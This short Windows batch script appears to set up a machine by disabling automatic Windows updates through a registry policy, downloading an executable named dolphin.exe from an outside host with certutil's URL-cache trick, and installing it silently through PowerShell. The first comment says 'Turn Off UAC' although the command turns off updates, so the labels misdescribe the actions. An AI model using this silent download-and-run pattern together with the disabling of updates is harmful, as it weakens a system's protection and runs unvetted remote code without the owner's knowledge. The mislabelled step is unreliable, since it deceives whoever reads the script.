::Turn Off UAC
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v NoAutoUpdate /t REG_DWORD /d 1 /f
::Download Dolphin Anty
certutil -urlcache -split -f https://download.cleverbee.me/dolphin.exe C:\Users\Public\Downloads\dolphin.exe
::Install Dolphin
PowerShell -Command "Start-Process 'C:\Users\Public\Downloads\dolphin.exe' -ArgumentList '/S','/v','/qn' -PassThru"
